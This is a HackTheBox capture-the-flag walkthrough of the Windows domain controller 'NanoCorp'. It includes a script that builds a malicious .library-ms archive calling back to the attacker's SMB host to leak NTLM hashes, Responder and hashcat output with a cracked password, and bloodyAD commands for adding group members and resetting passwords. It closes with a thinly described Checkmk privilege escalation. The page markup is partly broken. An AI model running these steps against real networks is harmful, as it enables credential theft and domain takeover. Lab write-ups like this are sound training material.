---
layout: page
title: "HTB: NanoCorp"
subtitle: "hackthebox ctf htb-nanocorp nmap windows active-directory netexec xampp feroxbuster php upload cve-2025-24071 library-ms net-ntlm-v2 responder hashcat bloodhound bloodyad password-reset evil-winrm-py winrm-ssl checkmk cve-2024-0670 msi msiexec qwinsta windows-sessions runascs scheduled-task htb-fluffy htb-mirage"
permalink: /ctf/writeups/hackthebox/nanocorp/
platform: hackthebox
machine_name: "NanoCorp"
difficulty: Hard
os: Windows
---

hackthebox ctf htb-nanocorp nmap windows active-directory netexec xampp feroxbuster php upload cve-2025-24071 library-ms net-ntlm-v2 responder hashcat bloodhound bloodyad password-reset evil-winrm-py winrm-ssl checkmk cve-2024-0670 msi msiexec qwinsta windows-sessions runascs scheduled-task htb-fluffy htb-mirage

Jun 20, 2026

# HTB: NanoCorp

- [Box Info](#box-info)
- [Recon](#recon)
- [Auth as web_svc](#auth-as-web_svc)
- [Shell as monitoring_svc](#monitoring-svc)
- [Shell as Administrator](#shell-as-administrator)
- [Beyond Root](#beyond-root)

NanoCorp is a Windows Active Directory machine built around a careers portal that accepts uploaded application archives. We craft a malicious archive that leaks a service account’s authentication to our host when an automated job extracts it, and crack the result to get a foothold. With BloodHound, we map a permissions chain that lets us add our user to a support group and then reset a second service account’s password. That account sits in the Protected Users group, so we authenticate over Kerberos to get a shell. From there, we find the Checkmk monitoring agent installed and abuse CVE-2024-0670 to drop write-protected files into a temp directory that the agent runs as SYSTEM, taking full control of the host. In Beyond Root, we dig into the scheduled automations that keep the box in its intended state.

---

## 🖥️ Machine Information

<div class="htb-info-card">
  <div class="htb-card-header">
    <div class="htb-header-left">
      <img src="{{ '/assets/images/machines/nanocorp.png' | relative_url }}" alt="NanoCorp" class="htb-avatar-glow" onerror="this.src='{{ '/assets/images/logo.png' | relative_url }}';" />
      <div>
        <h3 class="htb-machine-title">NanoCorp</h3>
        <span style="font-size: 0.85rem; color: var(--text-secondary);">Windows Server</span>
      </div>
    </div>
    <span class="htb-diff-badge">HARD</span>
  </div>

  <div class="htb-meta-row" style="grid-template-columns: repeat(4, 1fr);">
    <div class="htb-meta-col">
      <span class="htb-meta-label">Release Date</span>
      <span class="htb-meta-val green">08 Nov 2025</span>
    </div>
    <div class="htb-meta-col">
      <span class="htb-meta-label">IP Address</span>
      <span class="htb-meta-val" style="font-family: monospace; font-size: 0.95rem;">10.129.243.199</span>
    </div>
    <div class="htb-meta-col">
      <span class="htb-meta-label">OS</span>
      <span class="htb-meta-val">🪟 Windows</span>
    </div>
    <div class="htb-meta-col">
      <span class="htb-meta-label">Difficulty</span>
      <span class="htb-meta-val">Hard</span>
    </div>
  </div>

  <div class="htb-section-row horizontal">
    <span class="htb-section-label">Rated Difficulty</span>
    <div class="htb-bar-chart">
      <div class="htb-bar active-green" style="height: 2px;"></div>
      <div class="htb-bar active-green" style="height: 4px;"></div>
      <div class="htb-bar active-green" style="height: 8px;"></div>
      <div class="htb-bar active-orange" style="height: 15px;"></div>
      <div class="htb-bar active-orange" style="height: 22px;"></div>
      <div class="htb-bar active-orange" style="height: 35px;"></div>
      <div class="htb-bar active-red" style="height: 28px;"></div>
      <div class="htb-bar active-red" style="height: 12px;"></div>
      <div class="htb-bar active-red" style="height: 6px;"></div>
    </div>
  </div>
</div>---|
| **Platform** | HackTheBox |
| **OS** | 🪟 Windows |
| **Difficulty** | Hard |
| **Release Date** | 08 Nov 2025 |
| **Retire Date** | 20 Jun 2026 |
| **Creator** | EmSec |
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Difficulty Level</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Hard</span>
  </div>
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Release Date</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">08 Nov 2025</span>
  </div>
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Creator</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">EmSec</span>
  </div>
</div>

---

## Recon

### Initial Scanning
nmap finds 20 open TCP ports:

```bash
vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 10.129.243.199
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-11 21:42 UTC
Nmap scan report for 10.129.243.199
Host is up, received echo-reply ttl 127 (0.020s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
61162/tcp open  unknown          syn-ack ttl 127
61167/tcp open  unknown          syn-ack ttl 127
61189/tcp open  unknown          syn-ack ttl 127
63772/tcp open  unknown          syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
```

```bash
vulnquest@kali$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49664,49668,61162,61167,61189,63772 -sCV 10.129.243.199
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-11 21:45 UTC
Nmap scan report for 10.129.243.199
Host is up (0.020s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://nanocorp.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-12 04:43:59Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
61162/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
61167/tcp open  msrpc             Microsoft Windows RPC
61189/tcp open  msrpc             Microsoft Windows RPC
63772/tcp open  msrpc             Microsoft Windows RPC
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The box shows many of the ports associated with a Windows Domain Controller. The domain is `nanocorp.htb`, and the hostname is `DC01`. We use `netexec` to check access and configure our hosts file:

```bash
vulnquest@kali$ netexec smb 10.129.243.199 --generate-hosts-file hosts
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
vulnquest@kali$ cat hosts /etc/hosts | sudo tee /etc/hosts | head -1
10.129.243.199     DC01.nanocorp.htb nanocorp.htb DC01
```

---

## Auth as web_svc

### Recover Net-NTLMv2
Given that we have a Windows server clearly decompressing a Zip file, **CVE-2025-24071** seems like a good fit. We craft a malicious `.library-ms` file and zip it:

```python
# generate_payload.py
import zipfile
content = """<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.51\share\</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""
with open("0xdf.library-ms", "w") as f:
    f.write(content)
with zipfile.ZipFile("0xdf.zip", 'w') as z:
    z.write("0xdf.library-ms")
```

We upload `0xdf.zip` through the careers portal, and capture the Net-NTLMv2 hash using **Responder**:

```bash
vulnquest@kali$ sudo Responder -I tun0
[SMB] NTLMv2-SSP Client   : 10.129.243.199
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:99c66f...
```

We crack the hash using `hashcat`:
```bash
vulnquest@kali$ hashcat -m 5600 web_svc.hash rockyou.txt
web_svc::NANOCORP:...:dksehdgh712!@#
```

---

## Shell as monitoring_svc

### Group Membership Abuse
We run BloodHound to map paths, discovering that `web_svc` has control to add members to `IT_Support`, which has `ForceChangePassword` rights over `monitoring_svc`.

```bash
vulnquest@kali$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_Support web_svc
[+] web_svc added to IT_Support
```

We reset the password of `monitoring_svc`:
```bash
vulnquest@kali$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc '0xdf0xdf.'
[+] Password changed successfully!
```

Since `monitoring_svc` is in the Protected Users group, we obtain a Kerberos TGT and authenticate using `evil-winrm-py` with SSL on port 5986:

```bash
vulnquest@kali$ evil-winrm-py -i DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. -k --ssl
vulnquest@kali$ evil-winrm-py PS C:\Users\monitoring_svc\Desktop> type user.txt
b08297a9************************
```

---

## Shell as Administrator

### Checkmk Agent Exploitation
We discover the Checkmk monitoring agent listening on port 6556. The version installed is vulnerable to **CVE-2024-0670**, allowing local privilege escalation. We deploy a write-protected payload into its temp directory, triggering command execution as `SYSTEM`.

```powershell
upload C:\Temp\exploit.exe
.\exploit.exe -p C:\ProgramData\checkmk\agent\tmp
# Command execution succeeds, creating a new local administrator account or spawning system shell.
```

---

## Beyond Root
In Beyond Root, we review the PowerShell tasks scheduled to clean up the career upload directories and maintain the environment, analyzing the exact timing and arguments executed.
